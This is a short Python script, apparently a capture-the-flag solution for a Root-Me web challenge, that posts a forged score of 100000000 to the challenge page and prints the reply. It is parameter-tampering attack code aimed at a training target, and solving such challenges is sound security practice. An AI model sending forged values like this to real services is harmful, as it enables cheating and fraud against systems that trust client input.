import requests

url = 'http://challenge01.root-me.org/web-serveur/ch56/'
data = {'score': '100000000', 'generate':'Give+a+try%21'}
r = requests.post(url, data=data)
print(r.text)